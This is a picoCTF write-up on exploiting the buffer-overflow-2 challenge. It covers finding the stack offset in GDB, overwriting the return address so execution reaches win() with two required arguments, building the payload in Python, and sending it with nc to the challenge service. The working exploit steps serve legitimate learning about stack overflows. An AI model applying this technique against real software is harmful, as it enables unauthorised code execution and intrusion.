# PicoCTF — buffer-overflow-2

## Overview

This challenge is about using a buffer overflow to change the program's control flow and call a function called `win()` with two specific arguments.

The vulnerable function is:

```c
void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}
```

The problem is `gets()`. It reads input without checking whether it fits inside the buffer, so I can write past `buf` and overwrite other values on the stack.

The `win()` function has two checks:

```c
if (arg1 != 0xCAFEF00D)
    return;

if (arg2 != 0xF00DF00D)
    return;
```

So the goal is to overflow the buffer, overwrite the saved return address with the address of `win()`, and put the correct values where `win()` expects its arguments.

---

## Finding the offset

I started by testing the local binary with a long string of `A`s.

After entering 108 `A`s, the program crashed, which told me the input was reaching beyond the buffer.

I then looked at `vuln()` in GDB:

```asm
0x08049284 <+0>:    push   %ebp
0x08049285 <+1>:    mov    %esp,%ebp
...
0x08049299 <+21>:   lea    -0x6c(%ebp),%eax
0x0804929d <+25>:   call   0x8049050 <gets@plt>
...
0x080492b8 <+52>:   leave
0x080492b9 <+53>:   ret
```

`0x6c` is 108 in decimal, so the buffer starts at:

```text
EBP - 108
```

I stopped execution after `gets()` and examined the stack.

The saved return address was 112 bytes from the beginning of the buffer.

So the important offset is:

```text
112 bytes
```

That means:

```text
112 bytes of padding
→ saved return address
```

---

## Finding `win()`

Next I disassembled `win()`:

```asm
0x080491e6 <+0>:    push   %ebp
...
0x08049258 <+114>:  cmpl   $0xcafef00d,0x8(%ebp)
0x0804925f <+121>:  jne    0x804927b <win+149>
0x08049261 <+123>:  cmpl   $0xf00df00d,0xc(%ebp)
0x08049268 <+130>:  jne    0x804927e <win+152>
```

The address of `win()` is:

```text
0x080491e6
```

The assembly also tells me where the arguments are:

```text
EBP+8   → arg1
EBP+12  → arg2
```

And the required values are:

```text
arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D
```

---

## Understanding the stack layout

At first I thought I could just put:

```text
padding + win + arg1 + arg2
```

But `win()` is still a normal function, so it expects a return address of its own before its arguments.

The final layout therefore becomes:

```text
[112 bytes of padding]
[win() address]
[fake return address]
[arg1]
[arg2]
```

In my case:

```text
112 x "A"
0x080491e6
0x00000000
0xCAFEF00D
0xF00DF00D
```

The program is 32-bit and uses little-endian byte order, so the values are stored as:

```text
0x080491e6 → e6 91 04 08
0xCAFEF00D → 0d f0 fe ca
0xF00DF00D → 0d f0 0d f0
```

---

## Building the payload

I used Python so I could generate the actual binary bytes instead of typing them manually.

```python
import struct

payload = b"A" * 112
payload += struct.pack("<I", 0x080491e6)
payload += struct.pack("<I", 0x00000000)
payload += struct.pack("<I", 0xCAFEF00D)
payload += struct.pack("<I", 0xF00DF00D)

open("payload.bin", "wb").write(payload + b"\n")
```

The resulting file was 129 bytes:

```text
112 + 4 + 4 + 4 + 4 + 1 newline = 129
```

---

## Verifying everything with GDB

I ran the local binary using:

```gdb
break *0x080491e6
run < payload.bin
```

The program stopped at:

```text
Breakpoint 1, 0x080491e6 in win ()
```

This confirmed that the overwritten return address successfully redirected execution to `win()`.

I then checked the stack:

```gdb
x/4wx $esp
```

and got:

```text
0xffffcde0:
    0x00000000
    0xcafef00d
    0xf00df00d
    0x00000300
```

So the stack looked like:

```text
ESP
 ↓
0x00000000       fake return address
0xCAFEF00D       arg1
0xF00DF00D       arg2
```

I also checked the values from `win()`'s frame:

```gdb
x/3wx $ebp+4
```

which gave:

```text
0x00000000
0xcafef00d
0xf00df00d
```

That matched exactly what the function expected.

---

## Sending it to the remote service

The local binary was only useful for testing because I had my own empty `flag.txt`.

The actual challenge service was:

```text
nc xebec.cylabacademy.net 30413
```

I sent the same payload to the remote service:

```bash
python3 - <<'PY' | nc xebec.cylabacademy.net 30413
import struct
import sys

payload = b"A" * 112
payload += struct.pack("<I", 0x080491e6)
payload += struct.pack("<I", 0x00000000)
payload += struct.pack("<I", 0xCAFEF00D)
payload += struct.pack("<I", 0xF00DF00D)

sys.stdout.buffer.write(payload + b"\n")
PY
```

The important thing was that the values and stack layout I found locally were enough to reproduce the exploit against the challenge service.

---

## What I learned

This challenge made buffer overflows make much more sense to me.

Before this, I mostly thought of a buffer overflow as simply "putting too much data into a buffer." The GDB part helped me understand what is actually happening on the stack.

The main things I learned were:

- how to find the offset to the saved return address
- how to identify a useful function such as `win()`
- how function arguments are placed on the 32-bit stack
- why little-endian byte order matters
- how to build a binary payload instead of typing hexadecimal text
- how to use GDB to verify the payload before attacking the remote service

The biggest lesson for me was checking the stack directly instead of guessing what the program was doing.

## Final payload structure

```text
"A" * 112
+ 0x080491e6
+ 0x00000000
+ 0xCAFEF00D
+ 0xF00DF00D
```

This challenge was a great introduction to controlling a program's execution with a stack-based buffer overflow.